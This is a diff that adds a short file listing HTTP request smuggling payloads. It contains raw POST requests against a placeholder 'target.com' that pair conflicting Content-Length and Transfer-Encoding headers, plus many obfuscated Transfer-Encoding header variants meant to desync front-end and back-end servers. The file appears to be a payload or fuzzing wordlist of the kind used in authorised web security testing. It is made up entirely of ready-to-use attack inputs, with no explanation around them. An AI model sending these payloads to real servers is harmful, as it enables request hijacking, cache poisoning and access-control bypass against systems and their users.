@@ -1,0 +1,16 @@
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ\r\n
+Transfer-Encoding: chunked
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding:\tchunked
+Transfer-Encoding:\r\tchunked
+Transfer-Encoding: chunked\r\n\r\n
+X-Transfer-Encoding: chunked
+Content-Length: 0
+Content-Length: 0\r\nTransfer-Encoding: chunked
+Transfer-Encoding: chunked\r\nContent-Length: 0
+Content-Length: 30\r\nTransfer-Encoding: chunked
